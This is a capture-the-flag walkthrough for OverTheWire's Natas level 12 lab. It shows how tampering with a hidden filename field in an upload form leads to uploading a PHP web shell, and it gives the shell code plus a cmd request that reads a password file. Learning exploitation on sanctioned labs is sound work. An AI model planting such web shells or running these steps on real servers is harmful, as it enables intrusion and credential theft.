# Natas Level 12 

## Objective

Gain remote code execution by exploiting an insecure file upload mechanism and retrieve the password for the next level.

**URL:** `http://natas12.natas.labs.overthewire.org`
**Username:** `natas12`
**Password:** `<password from Natas 11>`

---

## Enumeration

After logging in, the page presents a simple file upload form. The HTML source reveals the following:

```html
<form enctype="multipart/form-data" action="index.php" method="POST">
    <input type="hidden" name="MAX_FILE_SIZE" value="1000" />
    <input type="hidden" name="filename" value="image.jpg" />
    <input type="file" name="uploadedfile" />
    <input type="submit" value="Upload File" />
</form>
```

A hidden field named `filename` determines the name under which the uploaded file is stored. The application trusts this client-side value without proper validation.

---

## Vulnerability

The server validates the uploaded file based on its content but allows the user to control the resulting filename through the hidden `filename` parameter.

By intercepting the request and changing:

```text
filename=image.jpg
```

to

```text
filename=shell.php
```

we can upload a PHP script that will be executed by the web server.

---

## Exploitation

### 1. Create a simple PHP web shell

Create a file named `shell.php` containing:

```php
<?php
echo shell_exec($_GET['cmd']);
?>
```

Alternatively, to directly read the next password:

```php
<?php
echo file_get_contents('/etc/natas_webpass/natas13');
?>
```

### 2. Upload the file

Select `shell.php` in the upload form.

Before submitting, intercept the request using a proxy tool such as **Burp Suite** and modify the hidden parameter:

```text
filename=image.jpg
```

to

```text
filename=shell.php
```

Forward the modified request.

### 3. Access the uploaded file

After a successful upload, the application returns the location of the uploaded file, for example:

```text
upload/shell.php
```

Browse to the uploaded shell:

```text
http://natas12.natas.labs.overthewire.org/upload/shell.php
```

If using the command execution shell, append a `cmd` parameter:

```text
http://natas12.natas.labs.overthewire.org/upload/shell.php?cmd=cat%20/etc/natas_webpass/natas13
```

The contents of `/etc/natas_webpass/natas13` are displayed, revealing the password for the next level.

---


**Flag:** Password for `natas13` obtained by reading:

```text
/\
└── etc
    └── natas_webpass
        └── natas13
```



